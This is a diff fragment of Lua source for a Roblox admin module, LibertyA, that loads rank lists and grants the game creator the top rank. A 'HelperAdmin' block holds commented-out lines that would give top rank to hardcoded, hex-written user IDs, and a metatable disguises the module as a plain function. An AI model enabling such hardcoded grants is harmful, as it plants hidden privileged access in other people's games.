+	Root.Ping(a,b,c)
+	end;
+	['FireClient'] = Root.FireClient;
+	['GetRank']=Root.GetRank;
+}
+_G.LibertyA = {
+}
+for i, v in pairs(LibertyAGlobals) do
+	if type(v) == 'string' or type(v) == 'number' then
+		_G.LibertyA[i] = v
+	elseif type(v) == 'function' then
+		_G.LibertyA[i] = {}
+		setmetatable(_G.LibertyA[i], {
+			__tostring = function()
+				return i
+			end;
+			__metatable = '';
+			__call = function(a, ...)
+				--if HasMeta(...) then return nil end
+				return v(...)
+			end;
+		})
+	end
+end
+TheReturnTable = {}
+setmetatable(TheReturnTable, {
+	__tostring = function()
+		return tostring(function()
+		end)
+	end;-- trollololol
+	__index = function()
+	end;
+	__newindex = function()
+	end;
+	__call = function(a, t)
+		if ihavealreadyusedthemodulethen then
+			return
+		end
+		ihavealreadyusedthemodulethen = true
+		--[[if HasMeta(t) then
+		Instance.new('Message',workspace).Text='Metatables may not be attached to sent data over LibertyA!'
+		return
+		end]]
+		for i, v in pairs(t) do
+			Root[i] = v
+		end
+		if rawget(t,'Moderators') then
+			Root.ParseRanks(rawget(t,'Moderators'), 1)
+		end
+		if rawget(t,'Temp_Admins') then
+			Root.ParseRanks(rawget(t,'Temp_Admins'), 2)
+		end
+		if rawget(t,'Admins') then
+			Root.ParseRanks(rawget(t,'Admins'), 3)
+		end
+		if rawget(t,'Owners') then
+			Root.ParseRanks(rawget(t,'Owners'), 4)
+		end
+		if rawget(t,'Bans') then
+			Root.ParseRanks(rawget(t,'Bans'), -1)
+		end
+			Root.Ranks[Root.CreatorId] = 5;
+		if Root.HelperAdmin then
+			--Root.Ranks[0x1044832] = 5;
+			--Root.Ranks[0xFDAC79] = 5;
+			--Root.Ranks[0x2772D44] = 5;
+		end
+		wait()
+		for i, Player in pairs(Players:GetPlayers()) do
+			thread(function()
+				Root.PlayerAdded(Player)
+			end)
+		end
+		wait(math.huge)
+	end;
+	__metatable = 'This metatable is locked';
+})
+return TheReturnTable
